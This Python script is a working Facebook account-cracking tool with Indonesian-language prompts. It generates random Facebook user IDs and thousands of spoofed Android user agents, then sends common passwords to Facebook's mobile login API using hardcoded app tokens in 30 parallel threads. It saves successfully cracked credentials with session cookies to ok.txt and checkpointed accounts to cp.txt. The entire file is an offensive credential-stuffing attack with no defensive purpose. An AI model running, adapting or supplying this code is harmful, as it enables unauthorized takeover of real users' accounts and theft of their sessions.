import requests, random, sys, os
from concurrent.futures import ThreadPoolExecutor
def clear():
	os.system('clear')
ugen = []
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='K)'
    d=random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')
    e=random.randint(1, 999)
    f=random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randint(73, 100)
    i='0'
    j=random.randint(4200, 4900)
    k=random.randint(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

def convert(cok):
    try:
        return f"datr={cok['datr']}; sb={cok['sb']}; fr={cok['fr']}; c_user={cok['c_user']}; xs={cok['xs']}"
    except:
        return ''

def crack(user, pw):
    global loop
    session = requests.Session()
    ua = random.choice(ugen)
    headers = {
        'User-Agent': ua,
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Host': 'b-api.facebook.com',
        'X-Fb-Connection-Type': 'mobile.CTRadioAccessTechnologyHSDPA',
        'X-Fb-Sim-Hni': str(random.randint(20000, 40000)),
        'X-Fb-Net-Hni': str(random.randint(20000, 40000)),
        'X-Fb-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
        'X-Tigon-Is-Retry': 'False',
        'Authorization': 'OAuth 256002347743983|62f8ce9f74b12f84c123cc23437a4a32',
        'X-Fb-Connection-Quality': 'EXCELLENT'
    }
    data = {
        "email": user,
        "password": pw,
        "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
        "locale": "en_US",
        "format": "json"
    }

    r = session.post('https://b-api.facebook.com/method/auth.login', headers=headers, data=data).json()
    if "session_key" in r and "EAAA" in r['access_token']:
        cookie = convert(session.cookies.get_dict())
        print(f"\r[OK] {user} | {pw} | {cookie}")
        with open("ok.txt", "a") as f:
            f.write(f"{user}|{pw}|{cookie}\n")
    elif "www.facebook.com" in r.get("error_msg", ""):
        print(f"\r[CP] {user} | {pw}")
        with open("cp.txt", "a") as f:
            f.write(f"{user}|{pw}\n")
    else:
        pass
    loop += 1
    sys.stdout.write(f"\r[•] Crack {loop}/{limit} → {user} | {pw} ...     ")
    sys.stdout.flush()

def main():
    global loop, limit
    loop = 0
    idz = []
    os.system('clear')
    limit = int(input("[?] Masukkan jumlah ID Random: "))
    
    for x in range(limit):
        idz.append("10000" + str(random.randint(100000000,999999999)))

    pw_list = ['123456','1234567','12345678','112233','786786','varkcozery']
    with ThreadPoolExecutor(max_workers=30) as executor:
        for user in idz:
            for pw in pw_list:
                executor.submit(crack, user, pw)

if __name__ == "__main__":
    main()